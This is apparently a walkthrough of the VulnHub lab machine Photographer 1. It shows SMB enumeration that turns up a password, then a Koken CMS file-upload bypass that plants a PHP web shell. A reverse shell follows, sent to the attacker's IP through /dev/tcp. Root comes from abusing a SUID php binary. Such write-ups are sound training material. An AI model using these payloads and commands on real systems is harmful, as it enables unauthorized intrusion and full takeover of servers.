---
title: VulnHub - Photographer 1
author: ret2x
date: 2021-11-12 11:00:21 +0800
categories: [Walkthrough, VulnHub]
tags: [vulnhub, file upload]
image:
    path: /assets/images/photographer/front.png
---

**Description:** A linux machine hosting a koken CMS whose version is vulnerable to File Upload. Inappropriate SUID permissions granted root privileges.

**Author:** v1n1v131r4

**Operating System:** Linux

**Download:** [https://www.vulnhub.com/entry/photographer-1,519/](https://www.vulnhub.com/entry/photographer-1,519/)

## Information Gathering
### Host Discovery

An ICMP request detected the target machine on the local network, the script that I developed you can find it [here](https://github.com/ret2x-tools/ping-scan.git).

```console
root@kali:~$ python3 ping-scan.py -r 192.168.179.0/24
192.168.179.164 is up
```

### Port Scanning

A full TCP port scan was performed to the target machine with nmap.

```console
root@kali:~$ nmap -n -v -p1-65535 --open -T5 192.168.179.164 -oG nmap/all-tcp-ports.txt
...
PORT     STATE SERVICE
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8000/tcp open  http-alt
```

### Service Enumeration

On open ports service detection and script scanning was done with nmap.

```console
root@kali:~$ nmap -n -v -sC -sV -p80,139,445,8000 192.168.179.164 -oN nmap/service-enum.txt
...
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Photographer by v1n1v131r4
139/tcp  open  netbios-ssn  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn  Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  ssl/http-alt Apache/2.4.18 (Ubuntu)
|_http-generator: Koken 0.22.24
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: daisa ahomi
MAC Address: 00:0C:29:8C:2B:76 (VMware)
Service Info: Host: PHOTOGRAPHER

Host script results:
|_clock-skew: mean: -3h19m59s, deviation: 2h53m12s, median: -5h00m00s
| nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   PHOTOGRAPHER<00>     Flags: <unique><active>
|   PHOTOGRAPHER<03>     Flags: <unique><active>
|   PHOTOGRAPHER<20>     Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: photographer
|   NetBIOS computer name: PHOTOGRAPHER\x00
|   Domain name: \x00
|   FQDN: photographer
|_  System time: 2021-11-12T08:30:16-05:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-11-12T13:30:16
|_  start_date: N/A
```


### Samba Enumeration

Enumerating the shared folders I found the resource sambashare.

```console
root@kali:~$ smbclient -L 192.168.179.164 -N       

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        sambashare      Disk      Samba on Ubuntu
        IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))
```

With a null session it was possible to access the resource sambashere, there are two files inside this directory, and I downloaded them to the attacking machine.

```console
root@kali:~$ smbclient //192.168.179.164/sambashare -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jul 20 20:30:07 2020
  ..                                  D        0  Tue Jul 21 04:44:25 2020
  mailsent.txt                        N      503  Mon Jul 20 20:29:40 2020
  wordpress.bkp.zip                   N 13930308  Mon Jul 20 20:22:23 2020

                278627392 blocks of size 1024. 264268400 blocks available
smb: \> get mailsent.txt
getting file \mailsent.txt of size 503 as mailsent.txt (7.2 KiloBytes/sec) (average 7.2 KiloBytes/sec)
smb: \> get wordpress.bkp.zip
getting file \wordpress.bkp.zip of size 13930308 as wordpress.bkp.zip (3206.9 KiloBytes/sec) (average 3156.5 KiloBytes/sec)
```

In the mailsent.txt file, there is a email for Daisa reminding her that not to forget the secret, that appears to be babygirl.

```console
root@kali:~$ cat mailsent.txt 
Message-ID: <4129F3CA.2020509@dc.edu>
Date: Mon, 20 Jul 2020 11:40:36 -0400
From: Agi Clarence <agi@photographer.com>
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Website's
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Hi Daisa!
Your site is ready now.
Don't forget your secret, my babygirl ;)
```


### Web Enumeration on port 8000

The web application on port 8000 is Koken 0.22.24 as we can see in the nmap output, this contains a File Upload Authenticated vulnerability, to exploit this issue we need to log in first, googling I found the path of the login form, **/admin**.

![](/assets/images/photographer/screenshot-1.png)

Daisa's email and password can be found in the **mailsent.txt** file, so logged in with those credentials.

`daisa@photographer.com:babygirl`

![](/assets/images/photographer/screenshot-2.png)

![](/assets/images/photographer/screenshot-3.png)

As we can see, it contains a text file with the instructions on how to exploit the vulnerability.

```console
root@kali:~$ searchsploit Koken
-------------------------------------------------------------------------- --------------------------
 Exploit Title                                                            |  Path
-------------------------------------------------------------------------- --------------------------
Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated)                 | php/webapps/48706.txt
-------------------------------------------------------------------------- --------------------------
```

## Exploitation
### Arbitrary File Upload

The Koken CMS upload restrictions are based on a list of allowed file extensions (withelist), which facilitates bypass through the handling of the HTTP request via Burp.

We need to create a malicious PHP file as shown below:

```console
root@kali:~$ echo '<?php system($_GET["cmd"]);?>' > image.php.jpg
```

Then, go to Koken CMS Dashboard, upload your file on "Import Content" button (Library panel) and send the HTTP request to Burp.

![](/assets/images/photographer/screenshot-4.png)

On Burp, rename your file to "image.php".

![](/assets/images/photographer/screenshot-5.png)

On Koken site click on "Timeline" and click on "Download File" to see where your file is hosted on server.

![](/assets/images/photographer/screenshot-6.png)

As we can see our malicious PHP code was uploaded and we can execute system commands.

```console
root@kali:~$ curl -s http://192.168.179.164:8000/storage/originals/bc/b3/image.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We set up a netcat listener and run the following curl request.

```console
root@kali:~$ curl -s http://192.168.179.164:8000/storage/originals/bc/b3/image.php?cmd=$(urlencode -m '/bin/bash -c "bash -i >& /dev/tcp/192.168.179.1/443 0>&1"')
```

We have a shell with www-data privileges, and upgraded it to a full tty shell, as shown below:

```console
script -qc /bin/bash /dev/null
Ctrl + z
stty raw -echo;fg
export SHELL=/bin/bash
```

```console
root@kali:~$ nc -vlnp 443
listening on [any] 443 ...
connect to [192.168.179.1] from (UNKNOWN) [192.168.179.164] 46838
bash: cannot set terminal process group (1192): Inappropriate ioctl for device
bash: no job control in this shell
www-data@photographer:/var/www/html/koken/storage/originals/bc/b3$ script -qc /bin/bash /dev/null
<www/html/koken/storage/originals/bc/b3$ script -qc /bin/bash /dev/null
www-data@photographer:/var/www/html/koken/storage/originals/bc/b3$ ^Z
zsh: suspended  nc -vlnp 443
root@kali:~$ stty raw -echo;fg
[1]  + continued  nc -vlnp 443
columns 164otographer:/var/www/html/koken/storage/originals/bc/b3$ stty rows 39  
www-data@photographer:/var/www/html/koken/storage/originals/bc/b3$
```

Listing the SUID binaries, an uncommon PHP executable has those permissions, so we can abuse it to escalate privileges.

```console
www-data@photographer:/home/agi/share$ find / -perm -u=s -type f 2>/dev/null
...
/usr/bin/php7.2
...
```

## Privilege Escalation
### SUID Binary

To get root I used the PHP function **pcntl_exec** that executes specified program in current process space maintaining the permissions of the binary, this was extracted from the [GTFOBINS](https://gtfobins.github.io/gtfobins/php/#suid) guide.


```console
www-data@photographer:/home/agi/share$ /usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
# python -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/bash")'
root@photographer:/home/agi/share# cd /root/
root@photographer:/root# ls
proof.txt
root@photographer:/root# cat proof.txt 
                                                                   
                                .:/://::::///:-`                                
                            -/++:+`:--:o:  oo.-/+/:`                            
                         -++-.`o++s-y:/s: `sh:hy`:-/+:`                         
                       :o:``oyo/o`. `      ```/-so:+--+/`                       
                     -o:-`yh//.                 `./ys/-.o/                      
                    ++.-ys/:/y-                  /s-:/+/:/o`                    
                   o/ :yo-:hNN                   .MNs./+o--s`                   
                  ++ soh-/mMMN--.`            `.-/MMMd-o:+ -s                   
                 .y  /++:NMMMy-.``            ``-:hMMMmoss: +/                  
                 s-     hMMMN` shyo+:.    -/+syd+ :MMMMo     h                  
                 h     `MMMMMy./MMMMMd:  +mMMMMN--dMMMMd     s.                 
                 y     `MMMMMMd`/hdh+..+/.-ohdy--mMMMMMm     +-                 
                 h      dMMMMd:````  `mmNh   ```./NMMMMs     o.                 
                 y.     /MMMMNmmmmd/ `s-:o  sdmmmmMMMMN.     h`                 
                 :o      sMMMMMMMMs.        -hMMMMMMMM/     :o                  
                  s:     `sMMMMMMMo - . `. . hMMMMMMN+     `y`                  
                  `s-      +mMMMMMNhd+h/+h+dhMMMMMMd:     `s-                   
                   `s:    --.sNMMMMMMMMMMMMMMMMMMmo/.    -s.                    
                     /o.`ohd:`.odNMMMMMMMMMMMMNh+.:os/ `/o`                     
                      .++-`+y+/:`/ssdmmNNmNds+-/o-hh:-/o-                       
                        ./+:`:yh:dso/.+-++++ss+h++.:++-                         
                           -/+/-:-/y+/d:yh-o:+--/+/:`                           
                              `-///////////////:`                               
                                                                                

Follow me at: http://v1n1v131r4.com


d41d8cd98f00b204e9800998ecf8427e
```
